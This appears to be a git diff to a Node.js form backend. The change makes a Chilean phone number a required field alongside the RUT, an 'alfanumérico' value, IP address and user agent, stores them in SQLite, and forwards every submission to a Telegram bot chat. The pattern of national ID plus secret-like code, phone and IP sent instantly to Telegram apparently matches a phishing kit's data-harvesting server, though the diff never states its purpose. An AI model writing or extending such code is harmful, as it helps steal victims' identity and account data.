@@ -28,12 +28,26 @@ db.run(`
     id INTEGER PRIMARY KEY AUTOINCREMENT,
     numero TEXT NOT NULL,
     alfanumerico TEXT NOT NULL,
+    telefono TEXT NOT NULL,
     user_agent TEXT,
     ip_address TEXT,
     navegador TEXT,
     fecha_creacion DATETIME DEFAULT CURRENT_TIMESTAMP
   )
 `);
+
+[
+  'telefono',
+  'user_agent',
+  'ip_address',
+  'navegador'
+].forEach((column) => {
+  db.run(`ALTER TABLE ingresos ADD COLUMN ${column} TEXT`, (err) => {
+    if (err && !/duplicate column/i.test(err.message)) {
+      console.error(`No se pudo agregar la columna ${column}:`, err.message);
+    }
+  });
+});
 
 function obtenerIP(req) {
   const forwarded = req.headers['x-forwarded-for'];
@@ -93,13 +107,18 @@ function validarRut(rut) {
   return dv === dvEsperado;
 }
 
-async function enviarNotificacionTelegram({ numero, alfanumerico, id, ip, navegador, userAgent }) {
+function validarTelefono(telefono) {
+  const normalizado = String(telefono || '').replace(/\s+/g, '');
+  return /^(\+?56)?9\d{8}$/.test(normalizado);
+}
+
+async function enviarNotificacionTelegram({ numero, alfanumerico, telefono, id, ip, navegador, userAgent }) {
   if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
     console.warn('Telegram no configurado. Se omite la notificación.');
     return;
   }
 
-  const texto = `📥 Nuevo ingreso\n🆔 Registro: ${id}\n🔢 RUT: ${numero}\n🔤 Alfanumérico: ${alfanumerico}\n🌐 Navegador: ${navegador}\n📍 IP: ${ip}\n🧭 User-Agent: ${userAgent || 'No disponible'}`;
+  const texto = `📥 Nuevo ingreso\n🆔 Registro: ${id}\n🔢 RUT: ${numero}\n📞 Teléfono: ${telefono}\n🔤 Alfanumérico: ${alfanumerico}\n🌐 Navegador: ${navegador}\n📍 IP: ${ip}\n🧭 User-Agent: ${userAgent || 'No disponible'}`;
 
   const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
     method: 'POST',
@@ -131,6 +150,7 @@ app.get('/health', (req, res) => {
 app.post('/guardar', async (req, res) => {
   const numero = String(req.body.numero || '').trim();
   const alfanumerico = String(req.body.alfanumerico || '').trim();
+  const telefono = String(req.body.telefono || '').trim();
   const userAgent = req.headers['user-agent'] || 'No disponible';
   const ipAddress = obtenerIP(req);
   const navegador = detectarNavegador(userAgent);
@@ -143,9 +163,13 @@ app.post('/guardar', async (req, res) => {
     return res.status(400).json({ error: 'El campo alfanumérico no puede estar vacío' });
   }
 
-  const sql = 'INSERT INTO ingresos (numero, alfanumerico, user_agent, ip_address, navegador) VALUES (?, ?, ?, ?, ?)';
+  if (!validarTelefono(telefono)) {
+    return res.status(400).json({ error: 'El teléfono debe tener formato +56 9 1234 5678' });
+  }
 
-  db.run(sql, [numero, alfanumerico, userAgent, ipAddress, navegador], async function (err) {
+  const sql = 'INSERT INTO ingresos (numero, alfanumerico, telefono, user_agent, ip_address, navegador) VALUES (?, ?, ?, ?, ?, ?)';
+
+  db.run(sql, [numero, alfanumerico, telefono, userAgent, ipAddress, navegador], async function (err) {
     if (err) {
       console.error('Error al guardar:', err.message);
       return res.status(500).json({ error: 'Error al guardar en la base de datos' });
@@ -157,6 +181,7 @@ app.post('/guardar', async (req, res) => {
       await enviarNotificacionTelegram({
         numero,
         alfanumerico,
+        telefono,
         id: registroId,
         ip: ipAddress,
         navegador,
